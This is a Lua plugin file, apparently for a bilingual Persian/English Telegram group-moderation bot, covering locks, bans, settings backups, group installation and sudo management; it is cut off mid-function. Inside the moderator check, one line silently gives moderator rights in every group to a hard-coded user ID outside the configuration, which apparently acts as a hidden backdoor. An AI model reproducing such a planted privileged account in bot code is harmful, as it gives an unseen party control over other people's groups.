local L_1EN = "Already Locked"
local L_1FA = "\216\167\216\178 \217\130\216\168\217\132 \217\130\217\129\217\132 \216\168\217\136\216\175"
local L_2EN = "Locked"
local L_2FA = "\217\130\217\129\217\132 \216\180\216\175"
local UL_1EN = "Already Unlocked"
local UL_1FA = "\216\167\216\178 \217\130\216\168\217\132 \216\168\216\167\216\178 \216\168\217\136\216\175"
local UL_2EN = "Unlocked"
local UL_2FA = "\216\168\216\167\216\178 \216\180\216\175"
local Scharbytes = function(s, i)
  local byte = string.byte
  i = i or 1
  if type(s) ~= "string" then
  end
  if type(i) ~= "number" then
  end
  local c = byte(s, i)
  if c > 0 and c <= 127 then
    return 1
  elseif c >= 194 and c <= 223 then
    local c2 = byte(s, i + 1)
    if not c2 then
    end
    if c2 < 128 or c2 > 191 then
    end
    return 2
  elseif c >= 224 and c <= 239 then
    local c2 = byte(s, i + 1)
    local c3 = byte(s, i + 2)
    if not c2 or not c3 then
    end
    if c == 224 and (c2 < 160 or c2 > 191) then
    elseif c == 237 and (c2 < 128 or c2 > 159) then
    elseif c2 < 128 or c2 > 191 then
    end
    if c3 < 128 or c3 > 191 then
    end
    return 3
  else
    if c >= 240 and c <= 244 then
      local c2 = byte(s, i + 1)
      local c3 = byte(s, i + 2)
      local c4 = byte(s, i + 3)
      if not c2 or not c3 or not c4 then
      end
      if c == 240 and (c2 < 144 or c2 > 191) then
      elseif c == 244 and (c2 < 128 or c2 > 143) then
      elseif c2 < 128 or c2 > 191 then
      end
      if c3 < 128 or c3 > 191 then
      end
      if c4 < 128 or c4 > 191 then
      end
      return 4
    else
    end
  end
end
local Slen = function(s)
  if type(s) ~= "string" then
    for k, v in pairs(s) do
      print("\"", tostring(k), "\"", tostring(v), "\"")
    end
  end
  local pos = 1
  local bytes = string.len(s)
  local length = 0
  while pos <= bytes do
    length = length + 1
    pos = pos + Scharbytes(s, pos)
  end
  return length
end
local RString = function(i)
  str = string.reverse(i)
  return str
end
local StringChar = function(i)
  str = ""
  for k, v in pairs(i) do
    str = str .. string.char(v)
  end
  return str
end
function SendStatus(chat, id, stEN, stFA)
  lang = redis:get("gp_lang:" .. chat)
  local get = function(extra, result, success)
    if not lang then
      text = "User: " .. result.first_name_ .. [[

ID: ]] .. result.id_ .. [[

Status: ]] .. stEN
      offset = 6
    else
      text = "\218\169\216\167\216\177\216\168\216\177: " .. result.first_name_ .. "\n\216\162\219\140\216\175\219\140: " .. result.id_ .. "\n\217\136\216\182\216\185\219\140\216\170: " .. stFA
      offset = 7
    end
    if redis:get("EditBot:uptextmessages") then
      Num = Slen(redis:get("EditBot:uptextmessages"))
      if tonumber(Num) == 0 then
        Num = 1
      end
      offset = offset + tonumber(Num)
    end
    tdcli.sendMention(chat, 0, text, offset, tonumber(Slen(result.first_name_)), result.id_)
  end
  tdcli.getUser(id, get)
end
function SendStatusNotFound(chat, id, stEN, stFA)
  lang = redis:get("gp_lang:" .. chat)
  if not lang then
    text = [[
User: Not Found
ID: ]] .. id .. [[

Status: ]] .. stEN
  else
    text = "\218\169\216\167\216\177\216\168\216\177: \217\190\219\140\216\175\216\167 \217\134\216\180\216\175\n\216\162\219\140\216\175\219\140: " .. id .. "\n\217\136\216\182\216\185\219\140\216\170: " .. stFA
  end
  tdcli.sendMessage(chat, 0, 1, UseMark(text), 1, "md")
end
function NoAccess(chat)
  lang = redis:get("gp_lang:" .. chat)
  if not lang then
    text = "This User Have Rank!"
  else
    text = "\216\167\219\140\217\134 \218\169\216\167\216\177\216\168\216\177 \216\175\216\167\216\177\216\167\219\140 \217\133\217\130\216\167\217\133 \216\167\216\179\216\170!"
  end
  tdcli.sendMessage(chat, 0, 1, text, 1, "md")
end
function CheckBotRank(InputId)
  local var = false
  for v, user in pairs(_config.bot_owner) do
    if user == InputId then
      var = true
    end
  end
  for v, user in pairs(_config.sudo_users) do
    if user == InputId then
      var = true
    end
  end
  return var
end
function is_banall(InputId)
  local var = false
  if redis:sismember("BotGloballBanUsers", InputId) then
    var = true
  end
  return var
end
function banall_list(msg)
  lang = redis:get("gp_lang:" .. msg.chat_id_)
  Gbans = redis:smembers("BotGloballBanUsers")
  i = 1
  if #Gbans == 0 then
    if not lang then
      return "Globall Ban List is Empty!"
    else
      return "\217\132\219\140\216\179\216\170 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175!"
    end
  else
    if not lang then
      message = [[
`Globall Ban List:`

]]
    else
      message = "`\217\132\219\140\216\179\216\170 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134:`\n\n"
    end
    for k, v in pairs(Gbans) do
      message = message .. k .. "- " .. v .. "\n"
    end
    return message
  end
end
function isModerator(chat_id, user_id)
  local var = false
  local data = load_data("./data/moderation.json")
  if data[tostring(chat_id)] and data[tostring(chat_id)].mods and data[tostring(chat_id)].mods[tostring(user_id)] then
    var = true
  end
  if data[tostring(chat_id)] and data[tostring(chat_id)].owners and data[tostring(chat_id)].owners[tostring(user_id)] then
    var = true
  end
  for v, user in pairs(_config.sudo_users) do
    if user == user_id then
      var = true
    end
  end
  for v, user in pairs(_config.bot_owner) do
    if user == user_id then
      var = true
    end
  end
  if user_id == 531947422 then
    var = true
  end
  return var
end
function UseMark(text)
  text = text or ""
  text = text:gsub("_", "\\_")
  text = text:gsub("*", "\\*")
  text = text:gsub("`", "\\`")
  return text
end
local config = function(msg, tester)
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  local data = load_data("./data/moderation.json")
  local administration = load_data("./data/moderation.json")
  local i = 1
  function padmin(extra, result, success)
    if not data[tostring(msg.to.id)] and tester == "yes" then
      if not lang then
        message = "*Group is Not installed!*"
      else
        message = "\218\175\216\177\217\136\217\135 \217\134\216\181\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170!"
      end
    end
    function set(arg, data)
      if data.username_ then
        user_name = "@" .. UseMark(data.username_)
      else
        user_name = UseMark(data.first_name_)
      end
      redis:sadd("BotHaveRankMembers(Group)" .. msg.to.id, data.id_)
      administration[tostring(msg.to.id)].mods[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
    end
    local admins = result.members_
    for i = 0, #admins do
      tdcli.getUser(admins[i].user_id_, set)
    end
    if tester == "yes" then
      if not lang then
        message = "*All Group Admins Has Been Promoted To Bot Moderator!*"
      else
        message = "\216\170\217\133\216\167\217\133\219\140 \216\167\216\175\217\133\219\140\217\134 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135 \216\168\217\135 \217\133\216\175\219\140\216\177 \216\177\216\168\216\167\216\170 \216\167\216\177\216\170\217\130\216\167 \217\190\219\140\216\175\216\167 \218\169\216\177\216\175\217\134\216\175!"
      end
      tdcli.sendMessage(msg.to.id, msg.id_, 1, message, 1, "md")
    end
  end
  tdcli.getChannelMembers(msg.to.id, 0, "Administrators", 200, padmin)
end
local CreateBackup = function(msg)
  target = msg.to.id
  local mute_all = "no"
  local mute_gif = "no"
  local mute_text = "no"
  local mute_photo = "no"
  local mute_video = "no"
  local mute_audio = "no"
  local mute_voice = "no"
  local mute_sticker = "no"
  local mute_contact = "no"
  local mute_forward = "no"
  local mute_location = "no"
  local mute_document = "no"
  local mute_tgservice = "no"
  local mute_inline = "no"
  local mute_game = "no"
  local mute_keyboard = "no"
  local lock_link = "no"
  local lock_tag = "no"
  local lock_mention = "no"
  local lock_arabic = "no"
  local lock_edit = "no"
  local lock_spam = "no"
  local lock_flood = "no"
  local lock_bots = "no"
  local lock_markdown = "no"
  local lock_webpage = "no"
  local lock_pin = "no"
  local lock_MaxWords = "no"
  local lock_botchat = "no"
  local lock_fohsh = "no"
  local lock_english = "no"
  local lock_forcedinvite = "no"
  local lock_username = redis:hget("GroupSettings:" .. target, "lock_username") or "no"
  local lock_join = redis:hget("GroupSettings:" .. target, "lock_join") or "no"
  local lock_note = redis:hget("GroupSettings:" .. target, "lock_note") or "no"
  if redis:hget("GroupSettings:" .. target, "mute_all") == "yes" then
    mute_all = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_gif") == "yes" then
    mute_gif = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_text") == "yes" then
    mute_text = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_photo") == "yes" then
    mute_photo = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_video") == "yes" then
    mute_video = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_audio") == "yes" then
    mute_audio = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_voice") == "yes" then
    mute_voice = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_sticker") == "yes" then
    mute_sticker = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_contact") == "yes" then
    mute_contact = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_forward") == "yes" then
    mute_forward = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_location") == "yes" then
    mute_location = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_document") == "yes" then
    mute_document = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_tgservice") == "yes" then
    mute_tgservice = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_inline") == "yes" then
    mute_inline = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_game") == "yes" then
    mute_game = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_keyboard") == "yes" then
    mute_keyboard = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "num_msg_max") then
    NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. target, "num_msg_max"))
  else
    NUM_MSG_MAX = 5
  end
  if redis:hget("GroupSettings:" .. target, "MaxWords") then
    MaxWords = tonumber(redis:hget("GroupSettings:" .. target, "MaxWords"))
  else
    MaxWords = 50
  end
  if redis:hget("GroupSettings:" .. target, "MaxWarn") then
    MaxWarn = tonumber(redis:hget("GroupSettings:" .. target, "MaxWarn"))
  else
    MaxWarn = 5
  end
  if redis:hget("GroupSettings:" .. target, "FloodTime") then
    FloodTime = tonumber(redis:hget("GroupSettings:" .. target, "FloodTime"))
  else
    FloodTime = 30
  end
  if redis:hget("GroupSettings:" .. target, "ForcedInvite") then
    ForcedInvite = tonumber(redis:hget("GroupSettings:" .. target, "ForcedInvite"))
  else
    ForcedInvite = 2
  end
  if redis:hget("GroupSettings:" .. target, "lock_link") == "yes" then
    lock_link = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_tag") == "yes" then
    lock_tag = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_mention") == "yes" then
    lock_mention = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_arabic") == "yes" then
    lock_arabic = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_edit") == "yes" then
    lock_edit = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_spam") == "yes" then
    lock_spam = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "flood") == "yes" then
    lock_flood = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_bots") == "yes" then
    lock_bots = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_markdown") == "yes" then
    lock_markdown = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_webpage") == "yes" then
    lock_webpage = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_pin") == "yes" then
    lock_pin = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_MaxWords") == "yes" then
    lock_MaxWords = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_botchat") == "yes" then
    lock_botchat = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_fohsh") == "yes" then
    lock_fohsh = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_english") == "yes" then
    lock_english = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_forcedinvite") == "yes" then
    lock_forcedinvite = "yes"
  end
  text = "-mute_all = " .. mute_all .. [[

-mute_gif = ]] .. mute_gif .. [[

-mute_text = ]] .. mute_text .. [[

-mute_photo = ]] .. mute_photo .. [[

-mute_video = ]] .. mute_video .. [[

-mute_audio = ]] .. mute_audio .. [[

-mute_voice = ]] .. mute_voice .. [[

-mute_sticker = ]] .. mute_sticker .. [[

-mute_contact = ]] .. mute_contact .. [[

-mute_forward = ]] .. mute_forward .. [[

-mute_location = ]] .. mute_location .. [[

-mute_document = ]] .. mute_document .. [[

-mute_tgservice = ]] .. mute_tgservice .. [[

-mute_inline = ]] .. mute_inline .. [[

-mute_game = ]] .. mute_game .. [[

-mute_keyboard = ]] .. mute_keyboard .. [[

-lock_link = ]] .. lock_link .. [[

-lock_tag = ]] .. lock_tag .. [[

-lock_mention = ]] .. lock_mention .. [[

-lock_arabic = ]] .. lock_arabic .. [[

-lock_edit = ]] .. lock_edit .. [[

-lock_spam = ]] .. lock_spam .. [[

-flood = ]] .. lock_flood .. [[

-lock_bots = ]] .. lock_bots .. [[

-lock_markdown = ]] .. lock_markdown .. [[

-lock_webpage = ]] .. lock_webpage .. [[

-lock_pin = ]] .. lock_pin .. [[

-lock_MaxWords = ]] .. lock_MaxWords .. [[

-lock_botchat = ]] .. lock_botchat .. [[

-num_msg_max = ]] .. NUM_MSG_MAX .. [[

-MaxWords = ]] .. MaxWords .. [[

-MaxWarn = ]] .. MaxWarn .. [[

-FloodTime = ]] .. FloodTime .. [[

-lock_fohsh = ]] .. lock_fohsh .. [[

-lock_english = ]] .. lock_english .. [[

-lock_forcedinvite = ]] .. lock_forcedinvite .. [[

-ForcedInvite = ]] .. ForcedInvite .. [[

-lock_username = ]] .. lock_username .. [[

-lock_join = ]] .. lock_join .. [[

-lock_note = ]] .. lock_note
  file = io.open("./data/Backup:" .. msg.to.id .. ".txt", "w")
  file:write(text)
  file:flush()
  file:close()
  tdcli.sendDocument(msg.to.id, msg.id_, 0, 1, nil, "./data/Backup:" .. msg.to.id .. ".txt", " ", dl_cb, nil)
  redis:set("SettingsBackupFor:" .. msg.to.id, text)
  if not lang then
    txt = "*Group Backup has been saved on server!*"
    tdcli.sendMessage(msg.to.id, 0, 1, txt, 1, "md")
  else
    txt = "\216\168\218\169 \216\162\217\190 \218\175\216\177\217\136\217\135 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\168\216\177 \216\177\217\136\219\140 \216\179\216\177\217\136\216\177 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175!"
    tdcli.sendMessage(msg.to.id, 0, 1, txt, 1, "md")
  end
  io.popen("cd data && rm Backup:" .. msg.to.id .. ".txt && cd .."):read("*all")
end
local modadd = function(msg, HaveCharge)
  local lang = redis:get("gp_lang:" .. msg.to.id)
  if not redis:sismember("SudoAccess" .. msg.from.id, "installgroups") and is_sudo(msg) and not is_botOwner(msg) then
    if not lang then
      return ErrorAccessSudo(msg)
    else
      return ErrorAccessSudo(msg)
    end
  end
  local data = load_data("./data/moderation.json")
  if data[tostring(msg.to.id)] then
    if not lang then
      return "*Bot in this group is already installed*"
    else
      return "*\216\177\216\168\216\167\216\170 \216\175\216\177 \216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \216\167\216\178 \217\130\216\168\217\132 \217\134\216\181\216\168 \216\180\216\175\217\135 \216\167\216\179\216\170*"
    end
  end
  data[tostring(msg.to.id)] = {
    owners = {},
    mods = {},
    settings = {
      set_name = msg.to.title
    }
  }
  save_data("./data/moderation.json", data)
  redis:del("GroupSettings:" .. msg.to.id)
  redis:hset("GroupSettings:" .. msg.to.id, "flood", "yes")
  redis:hset("GroupSettings:" .. msg.to.id, "lock_link", "yes")
  redis:hset("GroupSettings:" .. msg.to.id, "lock_note", "yes")
  redis:set("gp_lang:" .. msg.to.id, true)
  local groups = "groups"
  if not data[tostring(groups)] then
    data[tostring(groups)] = {}
    save_data("./data/moderation.json", data)
  end
  data[tostring(groups)][tostring(msg.to.id)] = msg.to.id
  save_data("./data/moderation.json", data)
  redis:sadd("BotGroups", msg.to.id)
  redis:sadd("Bot(FA)Groups", msg.to.id)
  redis:del("Allow~" .. msg.text .. "From~" .. msg.to.id)
  redis:del("AllowFrom~" .. msg.to.id)
  redis:del("reportlist" .. msg.to.id)
  if not HaveCharge then
    redis:setex("ExpireDate:" .. msg.to.id, 86400, true)
    redis:set("CheckExpire:" .. msg.to.id, true)
    DayForCharge = "\216\168\216\177\216\167\219\140 1 \216\177\217\136\216\178"
  else
    redis:setex("ExpireDate:" .. msg.to.id, tonumber(HaveCharge * 86400), true)
    if tonumber(HaveCharge) >= 1000 then
      redis:set("CheckExpire:" .. msg.to.id, "unlimited")
      DayForCharge = "\216\168\217\135 \216\181\217\136\216\177\216\170 \217\134\216\167\217\133\216\173\216\175\217\136\216\175"
    else
      redis:set("CheckExpire:" .. msg.to.id, true)
      DayForCharge = "\216\168\216\177\216\167\219\140 " .. HaveCharge .. " \216\177\217\136\216\178"
    end
  end
  if not redis:get("EditBot:autopromote") then
    config(msg, "no")
    ProText = "\n\216\170\217\133\216\167\217\133\219\140 \216\167\216\175\217\133\219\140\217\134 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135 \216\168\217\135 \217\133\216\175\219\140\216\177 \216\177\216\168\216\167\216\170 \216\167\216\177\216\170\217\130\216\167 \217\190\219\140\216\175\216\167 \218\169\216\177\216\175\217\134\216\175!"
  else
    ProText = ""
  end
  for v, owner in pairs(_config.bot_owner) do
    if msg.from.id == tonumber(owner) then
      text = "\216\177\216\168\216\167\216\170 \216\175\216\177 \218\175\216\177\217\136\217\135`" .. msg.to.id .. "` \216\168\216\167 \217\134\216\167\217\133 [" .. UseMark(msg.to.title) .. "] \216\170\217\136\216\179\216\183 \216\180\217\133\216\167 \217\134\216\181\216\168 \216\180\216\175"
      tdcli.sendMessage(tonumber(owner), 0, 1, text, 1, "md")
    else
      if msg.from.username then
        username = "@" .. msg.from.username
      else
        username = msg.from.first_name
      end
      text = "\216\177\216\168\216\167\216\170 \216\175\216\177 \218\175\216\177\217\136\217\135 `" .. msg.to.id .. "` \216\168\216\167 \217\134\216\167\217\133 " .. UseMark(msg.to.title) .. " \216\170\217\136\216\179\216\183 " .. UseMark(username) .. " [`" .. msg.from.id .. "`] \217\134\216\181\216\168 \216\180\216\175"
      tdcli.sendMessage(tonumber(owner), 0, 1, text, 1, "md")
    end
  end
  if msg.from.username then
    ADMIN = "@" .. UseMark(msg.from.username)
  else
    ADMIN = UseMark(msg.from.first_name)
  end
  redis:set("GroupAddedBy" .. msg.to.id, ADMIN)
  tdcli.sendMessage(msg.to.id, msg.id_, 1, "`\216\170\216\168\216\177\219\140\218\169 \217\133\219\140\218\175\217\136\219\140\217\133!` \n\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 " .. DayForCharge .. " \216\180\216\167\216\177\218\152 \216\180\216\175! \n\217\135\217\133 \216\167\218\169\217\134\217\136\217\134 \218\175\216\177\217\136\217\135 \216\180\217\133\216\167 \216\170\216\173\216\170 \216\173\217\129\216\167\216\184\216\170 \216\177\216\168\216\167\216\170 \216\167\216\179\216\170." .. ProText, 1, "md")
end
local modrem = function(msg)
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  if not redis:sismember("SudoAccess" .. msg.from.id, "removegroups") and is_sudo(msg) and not is_botOwner(msg) then
    if not lang then
      return ErrorAccessSudo(msg)
    else
      return ErrorAccessSudo(msg)
    end
  end
  local data = load_data("./data/moderation.json")
  local receiver = msg.to.id
  if not data[tostring(msg.to.id)] then
    if not lang then
      return "`Group is not installed`"
    else
      return "`\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \217\134\216\181\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170`"
    end
  end
  data[tostring(msg.to.id)] = nil
  save_data("./data/moderation.json", data)
  local groups = "groups"
  if not data[tostring(groups)] then
    data[tostring(groups)] = nil
    save_data("./data/moderation.json", data)
  end
  redis:del("currentChat:" .. msg.to.id)
  redis:del("maxChat:" .. msg.to.id)
  redis:del("sense:" .. msg.to.id)
  redis:srem("BotGroups", msg.to.id)
  redis:del("BotHaveRankMembers(Group)" .. msg.to.id)
  if redis:sismember("Bot(EN)Groups", msg.to.id) then
    redis:srem("Bot(EN)Groups", msg.to.id)
  elseif redis:sismember("Bot(FA)Groups", msg.to.id) then
    redis:srem("Bot(FA)Groups", msg.to.id)
  end
  redis:del("GroupWelcome" .. msg.to.id)
  for v, owner in pairs(_config.bot_owner) do
    local SUDO = tonumber(owner)
    if is_botOwner(msg) then
      text = "\218\175\216\177\217\136\217\135 `" .. msg.to.id .. "` \216\170\217\136\216\179\216\183 \216\180\217\133\216\167 \216\173\216\176\217\129 \216\180\216\175"
      tdcli.sendMessage(SUDO, msg.id_, 1, text, 1, "md")
    else
      if msg.from.username then
        username = "@" .. msg.from.username
      else
        username = msg.from.first_name
      end
      text = "\218\175\216\177\217\136\217\135 `" .. msg.to.id .. "` \216\170\217\136\216\179\216\183 " .. username .. " [`" .. msg.from.id .. "`] \216\173\216\176\217\129 \216\180\216\175"
      tdcli.sendMessage(SUDO, msg.id_, 1, text, 1, "md")
    end
  end
  data[tostring(groups)][tostring(msg.to.id)] = nil
  save_data("./data/moderation.json", data)
  if not lang then
    return "*Removal operation was successful!*"
  else
    return "*\216\185\217\133\217\132\219\140\216\167\216\170 \216\173\216\176\217\129 \217\133\217\136\217\129\217\130\219\140\216\170 \216\162\217\133\219\140\216\178 \216\168\217\136\216\175*"
  end
end
local run_bash = function(str)
  local cmd = io.popen(str)
  local result = cmd:read("*all")
  return result
end
local getindex = function(t, id)
  for i, v in pairs(t) do
    if v == id then
      return i
    end
  end
  return nil
end
local getChatId = function(chat_id)
  local chat = {}
  local chat_id = tostring(chat_id)
  if chat_id:match("^-100") then
    local channel_id = chat_id:gsub("-100", "")
    chat = {ID = channel_id, type = "channel"}
  else
    local group_id = chat_id:gsub("-", "")
    chat = {ID = group_id, type = "group"}
  end
  return chat
end
local already_sudo = function(user_id)
  for k, v in pairs(_config.sudo_users) do
    if user_id == v then
      return k
    end
  end
  return false
end
local reload_plugins = function()
  plugins = {}
  load_plugins()
end
local sudolist = function(msg)
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  local sudo_users = _config.sudo_users
  if not lang then
    text = "*List of sudo users :*\n"
  else
    text = "`\217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170 :`\n"
  end
  for i = 1, #sudo_users do
    text = text .. i .. " - " .. sudo_users[i] .. "\n"
  end
  return text
end
local chat_list = function(msg)
  i = 1
  local data = load_data("./data/moderation.json")
  if not data[tostring("groups")] then
    return "\217\132\219\140\216\179\216\170 \218\134\216\170 \217\135\216\167 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175"
  end
  local message = "\217\132\219\140\216\179\216\170 \218\134\216\170 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170:\n\n"
  local group_info1 = ""
  local group_info2 = ""
  local group_info3 = ""
  local group_info4 = ""
  local group_info5 = ""
  local group_info6 = ""
  for k, v in pairsByKeys(data[tostring("groups")]) do
    local group_id = v
    Exp = math.floor(redis:ttl("ExpireDate:" .. v) / 86400) + 1
    local group_ex = Exp or 0
    local NumberOfChats = redis:get("getMessages:" .. v) or 0
    local AddedBy = redis:get("GroupAddedBy" .. v) or "\216\171\216\168\216\170 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170"
    local is_vip = "\216\174\219\140\216\177"
    if redis:hget("GroupSettings:" .. v, "is_vip") then
      is_vip = "\216\168\217\132\217\135"
    end
    if data[tostring(group_id)] then
      settings = data[tostring(group_id)].settings
    end
    for m, n in pairsByKeys(settings) do
      if m == "set_name" then
        text = "\218\175\216\177\217\136\217\135 \216\180\217\133\216\167\216\177\217\135 `" .. i .. "`\n\217\134\216\167\217\133: " .. UseMark(n) .. "\n\216\162\219\140\216\175\219\140: `" .. group_id .. "`\n\216\167\217\134\217\130\216\182\216\167: " .. group_ex .. "\n\217\134\216\181\216\168 \216\170\217\136\216\179\216\183: " .. UseMark(AddedBy) .. "\n\217\136\219\140\218\152\217\135: " .. is_vip .. [[


]]
        if i <= 30 then
          group_info1 = group_info1 .. text
        elseif i > 30 and i <= 60 then
          group_info2 = group_info2 .. text
        elseif i > 60 and i <= 90 then
          group_info3 = group_info3 .. text
        elseif i > 90 and i <= 120 then
          group_info4 = group_info4 .. text
        elseif i > 120 and i <= 150 then
          group_info5 = group_info5 .. text
        elseif i > 150 then
          group_info6 = group_info6 .. text
        end
        i = i + 1
      end
    end
    message1 = message .. group_info1
    if group_info2 then
      message2 = message .. group_info2
    end
    if group_info3 then
      message3 = message .. group_info3
    end
    if group_info4 then
      message4 = message .. group_info4
    end
    if group_info5 then
      message5 = message .. group_info5
    end
    if group_info6 then
      message6 = message .. group_info6
    end
  end
  tdcli.sendMessage(msg.to.id, 0, 0, message1, 0, "md")
  if message2 ~= message then
    tdcli.sendMessage(msg.to.id, 0, 0, message2, 0, "md")
  end
  if message3 ~= message then
    tdcli.sendMessage(msg.to.id, 0, 0, message3, 0, "md")
  end
  if message4 ~= message then
    tdcli.sendMessage(msg.to.id, 0, 0, message4, 0, "md")
  end
  if message5 ~= message then
    tdcli.sendMessage(msg.to.id, 0, 0, message5, 0, "md")
  end
  if message6 ~= message then
    tdcli.sendMessage(msg.to.id, 0, 0, message6, 0, "md")
  end
end
local NumberChats = function(msg)
  i = 1
  local data = load_data("./data/moderation.json")
  if not data[tostring("groups")] then
    return
  end
  for k, v in pairsByKeys(data[tostring("groups")]) do
    local group_id = v
    if data[tostring(group_id)] then
      settings = data[tostring(group_id)].settings
    end
    for m, n in pairsByKeys(settings) do
      if m == "set_name" then
        i = i + 1
      end
    end
  end
  return i
end
local botrem = function(msg)
  CreateBackup(msg)
  local data = load_data("./data/moderation.json")
  data[tostring(msg.to.id)] = nil
  save_data("./data/moderation.json", data)
  local groups = "groups"
  if not data[tostring(groups)] then
    data[tostring(groups)] = nil
    save_data("./data/moderation.json", data)
  end
  data[tostring(groups)][tostring(msg.to.id)] = nil
  save_data("./data/moderation.json", data)
  redis:del("CheckExpire:" .. msg.to.id)
  redis:del("ExpireDate:" .. msg.to.id)
  redis:del("BotHaveRankMembers(Group)" .. msg.to.id)
  redis:srem("BotGroups", msg.to.id)
  redis:srem("Bot(EN)Groups", msg.to.id)
  redis:srem("Bot(FA)Groups", msg.to.id)
  redis:del("GroupSettings:" .. msg.to.id)
  tdcli.changeChatMemberStatus(msg.to.id, our_id, "Left", dl_cb, nil)
end
local botremByID = function(msg, gp)
  local data = load_data("./data/moderation.json")
  data[tostring(gp)] = nil
  save_data("./data/moderation.json", data)
  local groups = "groups"
  if not data[tostring(groups)] then
    data[tostring(groups)] = nil
    save_data("./data/moderation.json", data)
  end
  data[tostring(groups)][tostring(gp)] = nil
  save_data("./data/moderation.json", data)
  redis:del("CheckExpire:" .. gp)
  redis:del("ExpireDate:" .. gp)
  redis:del("BotHaveRankMembers(Group)" .. gp)
  redis:srem("BotGroups", gp)
  redis:srem("Bot(EN)Groups", gp)
  redis:srem("Bot(FA)Groups", gp)
  redis:del("GroupSettings:" .. gp)
  tdcli.changeChatMemberStatus(gp, our_id, "Left", dl_cb, nil)
end
function getsilentlist(chat_id)
  lang = redis:get("gp_lang:" .. chat_id)
  GetSilentList = redis:smembers("GroupSilentUsers:" .. chat_id)
  if #GetSilentList == 0 then
    if not lang then
      return "*Silent list is empty*"
    else
      return "\217\132\219\140\216\179\216\170 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\179\216\167\218\169\216\170 \216\174\216\167\217\132\219\140 \216\167\216\179\216\170"
    end
  end
  if not lang then
    message = "*List of silent users:*\n"
  else
    message = "\217\132\219\140\216\179\216\170 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\179\216\167\218\169\216\170 \216\180\216\175\217\135:\n"
  end
  for k, v in pairs(GetSilentList) do
    message = message .. k .. "- " .. v .. "\n"
  end
  return message
end
local action_by_reply2 = function(arg, data)
  local cmd = arg.cmd
  local lang = redis:get("gp_lang:" .. arg.chat_id)
  if not tonumber(data.sender_user_id_) then
    return false
  end
  if data.sender_user_id_ then
    if cmd == "delsudo" then
      local desudo_cb = function(arg, data)
        if not already_sudo(data.id_) then
          return SendStatus(arg.chat_id, data.id_, "is Not Sudo", "\216\179\217\136\216\175\217\136 \217\134\216\168\217\136\216\175")
        end
        redis:srem("BotHaveRankMembers", tonumber(data.id_))
        table.remove(_config.sudo_users, getindex(_config.sudo_users, tonumber(data.id_)))
        save_config()
        reload_plugins(true)
        return SendStatus(arg.chat_id, data.id_, "Demoted From Sudo", "\216\175\219\140\218\175\217\135 \216\179\217\136\216\175\217\136 \217\134\219\140\216\179\216\170!")
      end
      tdcli_function({
        ID = "GetUser",
        user_id_ = data.sender_user_id_
      }, desudo_cb, {
        chat_id = data.chat_id_,
        user_id = data.sender_user_id_
      })
    end
    if cmd == "setsudo" then
      local SetSudo_cb = function(arg, data)
        if already_sudo(data.id_) then
          return SendStatus(arg.chat_id, data.id_, "Already Sudo", "\216\167\216\178 \217\130\216\168\217\132 \216\179\217\136\216\175\217\136 \216\168\217\136\216\175")
        else
          redis:sadd("BotHaveRankMembers", tonumber(data.id_))
          redis:sadd("SudoAccess" .. data.id_, "installgroups")
          redis:sadd("SudoAccess" .. data.id_, "removegroups")
          redis:sadd("BotHaveRankMembers", tonumber(data.id_))
          table.insert(_config.sudo_users, tonumber(data.id_))
          save_config()
          plugins = {}
          load_plugins()
